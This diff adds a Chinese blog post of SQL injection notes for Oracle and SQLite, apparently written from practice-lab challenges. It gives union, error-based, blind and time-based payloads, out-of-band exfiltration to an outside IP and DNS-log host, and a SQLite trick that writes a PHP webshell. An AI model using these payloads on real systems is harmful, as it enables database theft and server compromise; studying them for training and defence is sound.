@@ -1,0 +1,405 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="不同数据库的注入方法(Oracle、Sqlite)" />
+
+
+<meta name="description" content="今天总结一下Oracle、Sqlite的注入方法。
+
+Oracle数据库题目地址：https://www.mozhe.cn/bug/detail/M2dRRXJqN3RqWnhvTGRTK1JJ..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    不同数据库的注入方法(Oracle、Sqlite) |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="不同数据库的注入方法(Oracle、Sqlite)">
+            
+            不同数据库的注入方法(Oracle、Sqlite)
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Oracle%E3%80%81Sqlite/" rel="tag">不同数据库的注入方法(Oracle、Sqlite)</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/04/02</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                344</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天总结一下Oracle、Sqlite的注入方法。</p>
+<a id="more"></a>
+<h1 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h1><p>题目地址：<br><a href="https://www.mozhe.cn/bug/detail/M2dRRXJqN3RqWnhvTGRTK1JJdjk5dz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/M2dRRXJqN3RqWnhvTGRTK1JJdjk5dz09bW96aGUmozhe</a></p>
+<p><strong>注意：Oracle查询最后的字段数据时如果表名列名啥的是小写的，用的是双引号不是单引号！</strong></p>
+<h2 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h2><p>dual、user_tables。<br>dual是Oracle的虚拟表，必定存在。而使用union猜字段数时必须得有表名，因此可以：union select xxx from dual。</p>
+<h2 id="爆当前用户"><a href="#爆当前用户" class="headerlink" title="爆当前用户"></a>爆当前用户</h2><pre><code>select sys_context(&apos;userenv&apos;,&apos;current_user&apos;)from dual where rownum=1 </code></pre><h2 id="爆所有用户"><a href="#爆所有用户" class="headerlink" title="爆所有用户"></a>爆所有用户</h2><pre><code>select username from all_users order by username</code></pre><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><pre><code>select distinct owner from all_tables where rownum=1</code></pre><p><code>all_tables</code>是所有的表，<code>all_tab_columns</code>是所有的列。</p>
+<h2 id="爆操作系统版本"><a href="#爆操作系统版本" class="headerlink" title="爆操作系统版本"></a>爆操作系统版本</h2><pre><code>select member from v$logfile where rownum=1</code></pre><h2 id="定位DB文件"><a href="#定位DB文件" class="headerlink" title="定位DB文件"></a>定位DB文件</h2><pre><code>select name from V$DATAFILE where rownum=1</code></pre><p>上面这些都是直接替换某个字段。用联合注入。</p>
+<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>order by 4</p>
+<h3 id="判断字段类型"><a href="#判断字段类型" class="headerlink" title="判断字段类型"></a>判断字段类型</h3><pre><code>union select null,null,null,null from dual</code></pre><p>先用null代替，然后判断每个字段的类型，如：</p>
+<pre><code>union select 1,null,null,null from dual
+union select &apos;1&apos;,null,null,null from dual</code></pre><p>如果第一句回显正确，第二句回显错误，那么就是数字型，反之是字符型。就这样一个字段一个字段判断下去，直至判断完所有字段或者<strong>有回显的数字</strong>了。注意，除了数字型和字符型还有其他类型的，因此用1,’1’,判断时都会报错，用null就行了。</p>
+<h3 id="爆数据库版本信息"><a href="#爆数据库版本信息" class="headerlink" title="爆数据库版本信息"></a>爆数据库版本信息</h3><pre><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual</code></pre><h3 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code>union select &apos;1&apos;,(select instance_name from v$instance) from dual</code></pre><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code>union select 1,(select table_name from user_tables where rownum=1),3,4 from dual
+union select 1,(select table_name from user_tables where rownum=1 and table_name not in(&apos;第一句爆出的表名&apos;)),3,4 from dual</code></pre><p>这道题表太多了…爆好久才行，因此需要使用Like。</p>
+<pre><code>union select &apos;1&apos;,(select table_name from user_tables where rownum=1 and table_name like &apos;%user%&apos;) from dual</code></pre><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><pre><code>union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos;),3,4 from dual
+union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos; and column_name not in(&apos;第一个列名&apos;)),3,4 from dual</code></pre><h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><pre><code>union select 1,列名1 || 列名2 ||列名3...，3,4 from 表名 where rownum=1</code></pre><p>使用||可以连接多个字段，concat只能练两个。</p>
+<h4 id="通过列名找到对应表"><a href="#通过列名找到对应表" class="headerlink" title="通过列名找到对应表"></a>通过列名找到对应表</h4><pre><code>select owner,table_name from all_tab_solumns where column_name like &apos;%username%&apos;</code></pre><p>username就是列名。</p>
+<h4 id="查询第N行内容"><a href="#查询第N行内容" class="headerlink" title="查询第N行内容"></a>查询第N行内容</h4><pre><code>select username from(select rownum r,username from all_users order by username)where r=9</code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="utl-inaddr-get-host-name函数"><a href="#utl-inaddr-get-host-name函数" class="headerlink" title="utl_inaddr.get_host_name函数"></a>utl_inaddr.get_host_name函数</h3><pre><code>and 1=utl_inaddr_get_host_name((select user from dual))</code></pre><h3 id="ctxsys-dirthsx-sn-函数"><a href="#ctxsys-dirthsx-sn-函数" class="headerlink" title="ctxsys.dirthsx.sn()函数"></a>ctxsys.dirthsx.sn()函数</h3><pre><code>and 1=ctxsys.dirthsx.sn(1,(select user from dual))</code></pre><h3 id="XMLType-函数"><a href="#XMLType-函数" class="headerlink" title="XMLType()函数"></a>XMLType()函数</h3><pre><code>and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null</code></pre><h3 id="dbms-xdb-version-chekin-函数"><a href="#dbms-xdb-version-chekin-函数" class="headerlink" title="dbms_xdb_version.chekin()函数"></a>dbms_xdb_version.chekin()函数</h3><pre><code>and (select dbms_xdb_version.chekin((select user from dual)) from dual) is not null</code></pre><p>dbms_xdb_version.makeversioned、dbms_xdb_version.uncheckout、dbms_utility.sqlid_to_sqlhash跟这个一样，替换函数名即可。</p>
+<h3 id="ordsys-ord-dicom-getmappingxpath-函数"><a href="#ordsys-ord-dicom-getmappingxpath-函数" class="headerlink" title="ordsys.ord_dicom.getmappingxpath()函数"></a>ordsys.ord_dicom.getmappingxpath()函数</h3><pre><code>and 1=ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user)</code></pre><h3 id="decode函数"><a href="#decode函数" class="headerlink" title="decode函数"></a>decode函数</h3><pre><code>and 1=(select decode(substr(user,1,1),&apos;S&apos;,(1/0),0) from dual)</code></pre><p>decode在这里不会回显报错，偏向于布尔型。</p>
+<h2 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h2><p>http请求和DNS查询，转发到服务器就能看到。实则就相当于DNSLog。</p>
+<h3 id="utl-http-request-函数"><a href="#utl-http-request-函数" class="headerlink" title="utl_http.request()函数"></a>utl_http.request()函数</h3><pre><code>and 1=utl_http.request(&apos;http://192.168.2.111:80&apos;||(select banner from sys.v_$version where rownum=1))</code></pre><p>该函数向指定主机发起http请求，携带了查询结果。</p>
+<h3 id="utl-inaddr-get-host-address-函数"><a href="#utl-inaddr-get-host-address-函数" class="headerlink" title="utl_inaddr.get_host_address()函数"></a>utl_inaddr.get_host_address()函数</h3><pre><code>and (select utl_inaddr.get_host_address((select user from dual)||&apos;xxx.ceye.io&apos; from dual) is not null</code></pre><p>DNS记录，将查询结果拼接到域名然后查询。就是DNSLog注入。</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="decode-函数"><a href="#decode-函数" class="headerlink" title="decode()函数"></a>decode()函数</h3><pre><code>and 1=(select decode(substr(user,1,1),&apos;S&apos;,(1),0) from dual)</code></pre><h3 id="instr-函数"><a href="#instr-函数" class="headerlink" title="instr()函数"></a>instr()函数</h3><pre><code>and 1=(instr((select user from dual),&apos;SQL&apos;))</code></pre><p>instr可以查询SQL在查出的结果中的位置并返回该位置。类似regexp。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="DBMS-PIPE-RECEIVE-MESSAGE-函数"><a href="#DBMS-PIPE-RECEIVE-MESSAGE-函数" class="headerlink" title="DBMS_PIPE.RECEIVE_MESSAGE()函数"></a>DBMS_PIPE.RECEIVE_MESSAGE()函数</h3><pre><code>and 1=(DBMS_PIPE.RECEIVE_MESSAGE(&apos;a&apos;,10))
+
+ AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),3,1))&gt;96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END) AND &apos;1&apos;=&apos;1&amp;sname=1 </code></pre><h3 id="decode-函数-1"><a href="#decode-函数-1" class="headerlink" title="decode()函数"></a>decode()函数</h3><pre><code>and 1=(select decode(substr(user,1,1),&apos;A&apos;,DBMS_PIPE.RECEIVE_MESSAGE(&apos;RDS&apos;,5) ,0) from dual)</code></pre><h3 id="decode与DBMS-PIPE-RECEIVE-MESSAGE嵌套"><a href="#decode与DBMS-PIPE-RECEIVE-MESSAGE嵌套" class="headerlink" title="decode与DBMS_PIPE.RECEIVE_MESSAGE嵌套"></a>decode与DBMS_PIPE.RECEIVE_MESSAGE嵌套</h3><pre><code>and 1=(select decode(substr(user,1,1),&apos;A&apos;,DBMS_PIPE.RECEIVE_MESSAGE(&apos;RDS&apos;,5) ,0) from dual) </code></pre><h1 id="Sqlite数据库"><a href="#Sqlite数据库" class="headerlink" title="Sqlite数据库"></a>Sqlite数据库</h1><p>CTF题目地址：<br><a href="https://www.mozhe.cn/bug/detail/UzRPT0FZSTZDeWVid2duMVcyV055dz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/UzRPT0FZSTZDeWVid2duMVcyV055dz09bW96aGUmozhe</a></p>
+<p>Sqlite是一个轻量级的数据库，它的数据类型就是无类型。它没有系统库，只有表，表名叫sqlite_master。不存在mysql中ord,ascii等，sqlite中应该使用char与hex。</p>
+<pre><code>select * from sqlite_master where type=char(0x74,0x61,0x62,0x6c,0x65)</code></pre><h2 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h2><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>同样order by, 再用union select 1,2,3…判断哪个字段可以回显。</p>
+<h3 id="爆数据库版本信息-1"><a href="#爆数据库版本信息-1" class="headerlink" title="爆数据库版本信息"></a>爆数据库版本信息</h3><pre><code>union select 1,2,sqlite_version()</code></pre><h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code>union select 1,2,group_concat(tbl_name) from sqlite_master where type=&apos;table&apos;</code></pre><h3 id="爆创建表的SQL语句，得到表结构"><a href="#爆创建表的SQL语句，得到表结构" class="headerlink" title="爆创建表的SQL语句，得到表结构"></a>爆创建表的SQL语句，得到表结构</h3><pre><code>union select 1,2,sql from sqlite_master where type=&apos;table&apos; and tbl_name=&apos;users&apos;</code></pre><p>表名是users，爆创建它的sql语句，从而知道所有列名。</p>
+<h3 id="爆字段数据"><a href="#爆字段数据" class="headerlink" title="爆字段数据"></a>爆字段数据</h3><pre><code>union select 1,2,group_concat(name,password) from users limit 1</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="爆版本长度"><a href="#爆版本长度" class="headerlink" title="爆版本长度"></a>爆版本长度</h3><pre><code>and length(sqlite_version())=6</code></pre><h3 id="爆第一位"><a href="#爆第一位" class="headerlink" title="爆第一位"></a>爆第一位</h3><pre><code>and substr(sqlite_version(),1,1)=&apos;3&apos;</code></pre><p>不能用ascii。第二、第三…同理。</p>
+<h3 id="爆表名长度"><a href="#爆表名长度" class="headerlink" title="爆表名长度"></a>爆表名长度</h3><pre><code>and (select length(name) from sqlite_master where type=&apos;table&apos; limit 0,1)=5</code></pre><h3 id="爆表名-2"><a href="#爆表名-2" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code>and substr((select name from sqlite_master where type=&apos;table&apos; limit 0,1)1,1)=&apos;5&apos;
+and substr((select name from sqlite_master where type=&apos;table&apos; limit 0,1)2,1)=&apos;5&apos;
+...</code></pre><p>爆出来的只是第一张表，可以通过limit 1,1…获取其它表。（实测没成功）</p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><pre><code>?id=1;attach database&apos;C:\\Sqlite\\xxx.php&apos; as test;create table test.exp(dataz text);insert into test.exp(dataz) values (&apos;&lt;?php phpinfo();?&gt;&apos;);</code></pre><p>首先attach database其实就是创建一个文件，而Sqlite中数据库就是文件，因此这也是在创建一个数据库。别名为test。再创建表test.exp。表名就是exp，列名是dataz，类型是text文本类型。再往里插进一句话，最后访问到就用蚁剑链接即可。</p>
+<p>参考文章：<br><a href="http://www.zhutougg.com/2017/02/26/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/02/26/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/</a><br><a href="https://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5760321.html</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/04/05/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Postgre%E3%80%81Db2/" class="pre-post btn btn-default" title='不同数据库的注入方法(Postgre、Db2)'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            不同数据库的注入方法(Postgre、Db2)</span>
+    </a>
+    
+    
+    <a href="/2020/04/01/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(Access%E3%80%81SQLServer)/" class="next-post btn btn-default" title='不同数据库的注入方法(Access、SQLServer)'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            不同数据库的注入方法(Access、SQLServer)</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle数据库"><span class="toc-text">Oracle数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#系统表"><span class="toc-text">系统表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前用户"><span class="toc-text">爆当前用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆所有用户"><span class="toc-text">爆所有用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库名"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆操作系统版本"><span class="toc-text">爆操作系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定位DB文件"><span class="toc-text">定位DB文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union联合查询"><span class="toc-text">union联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段"><span class="toc-text">爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断字段类型"><span class="toc-text">判断字段类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库版本信息"><span class="toc-text">爆数据库版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库名-1"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆列名"><span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段内容"><span class="toc-text">爆字段内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过列名找到对应表"><span class="toc-text">通过列名找到对应表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询第N行内容"><span class="toc-text">查询第N行内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#utl-inaddr-get-host-name函数"><span class="toc-text">utl_inaddr.get_host_name函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctxsys-dirthsx-sn-函数"><span class="toc-text">ctxsys.dirthsx.sn()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLType-函数"><span class="toc-text">XMLType()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xdb-version-chekin-函数"><span class="toc-text">dbms_xdb_version.chekin()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ordsys-ord-dicom-getmappingxpath-函数"><span class="toc-text">ordsys.ord_dicom.getmappingxpath()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode函数"><span class="toc-text">decode函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#带外通信"><span class="toc-text">带外通信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#utl-http-request-函数"><span class="toc-text">utl_http.request()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#utl-inaddr-get-host-address-函数"><span class="toc-text">utl_inaddr.get_host_address()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-函数"><span class="toc-text">decode()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#instr-函数"><span class="toc-text">instr()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DBMS-PIPE-RECEIVE-MESSAGE-函数"><span class="toc-text">DBMS_PIPE.RECEIVE_MESSAGE()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-函数-1"><span class="toc-text">decode()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode与DBMS-PIPE-RECEIVE-MESSAGE嵌套"><span class="toc-text">decode与DBMS_PIPE.RECEIVE_MESSAGE嵌套</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite数据库"><span class="toc-text">Sqlite数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#union查询"><span class="toc-text">union查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#判断字段数"><span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库版本信息-1"><span class="toc-text">爆数据库版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名-1"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆创建表的SQL语句，得到表结构"><span class="toc-text">爆创建表的SQL语句，得到表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段数据"><span class="toc-text">爆字段数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆版本长度"><span class="toc-text">爆版本长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆第一位"><span class="toc-text">爆第一位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名长度"><span class="toc-text">爆表名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名-2"><span class="toc-text">爆表名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
